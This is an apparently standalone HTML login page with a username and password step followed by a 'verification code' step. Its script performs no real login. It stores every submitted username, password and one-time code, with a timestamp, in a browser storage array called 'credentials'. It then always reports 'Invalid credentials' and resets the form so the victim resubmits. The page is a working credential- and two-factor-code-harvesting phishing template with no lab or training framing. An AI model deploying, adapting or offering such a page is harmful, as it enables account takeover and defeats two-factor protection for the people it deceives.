<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f4f4f4;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
            transition: height 0.3s ease;
        }
        .login-container h2 {
            margin-bottom: 20px;
            text-align: center;
        }
        .login-container input {
            width: 100%;
            padding: 10px;
            margin: 5px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        .login-container button {
            width: 100%;
            background-color: #4CAF50;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .login-container button:hover {
            opacity: 0.8;
        }
        .error-message {
            color: red;
            text-align: center;
            margin-top: 10px;
            display: none;
        }
        .verification-field {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #eee;
        }
        .verification-field.show {
            display: block;
        }
        .back-button {
            background-color: #6c757d;
            color: white;
            padding: 8px 12px;
            margin-bottom: 10px;
            font-size: 14px;
        }
        .back-button:hover {
            background-color: #5a6268;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Login</h2>
    <form id="loginForm">
        <div id="loginFields">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="button" id="continueBtn">Continue</button>
        </div>
        
        <div id="verificationField" class="verification-field">
            <button type="button" class="back-button" id="backBtn">← Back</button>
            <p>Enter the verification code sent to your device:</p>
            <input type="text" name="verification" placeholder="Verification Code" required>
            <button type="submit">Login</button>
        </div>
        
        <div class="error-message" id="errorMessage">Invalid credentials</div>
    </form>
</div>

<script>
    document.getElementById('continueBtn').addEventListener('click', function() {
        const username = document.querySelector('input[name="username"]').value;
        const password = document.querySelector('input[name="password"]').value;
        
        if (username && password) {
            // Show verification field
            document.getElementById('loginFields').style.display = 'none';
            document.getElementById('verificationField').classList.add('show');
        }
    });
    
    document.getElementById('backBtn').addEventListener('click', function() {
        // Hide verification field and show login fields
        document.getElementById('verificationField').classList.remove('show');
        document.getElementById('loginFields').style.display = 'block';
    });
    
    document.getElementById('loginForm').addEventListener('submit', function(e) {
        e.preventDefault();
        
        const username = document.querySelector('input[name="username"]').value;
        const password = document.querySelector('input[name="password"]').value;
        const verification = document.querySelector('input[name="verification"]').value;
        const timestamp = new Date().toISOString();
        
        // Store in localStorage
        let credentials = JSON.parse(localStorage.getItem('credentials') || '[]');
        credentials.push({ 
            username, 
            password, 
            verification,
            timestamp 
        });
        localStorage.setItem('credentials', JSON.stringify(credentials));
        
        // Show error message
        document.getElementById('errorMessage').style.display = 'block';
        
        // Reset the form after a delay
        setTimeout(() => {
            // Hide verification field and show login fields
            document.getElementById('verificationField').classList.remove('show');
            document.getElementById('loginFields').style.display = 'block';
            
            // Clear all fields
            document.querySelector('input[name="username"]').value = '';
            document.querySelector('input[name="password"]').value = '';
            document.querySelector('input[name="verification"]').value = '';
            
            // Hide error message
            document.getElementById('errorMessage').style.display = 'none';
        }, 2000);
    });
</script>

</body>
</html>
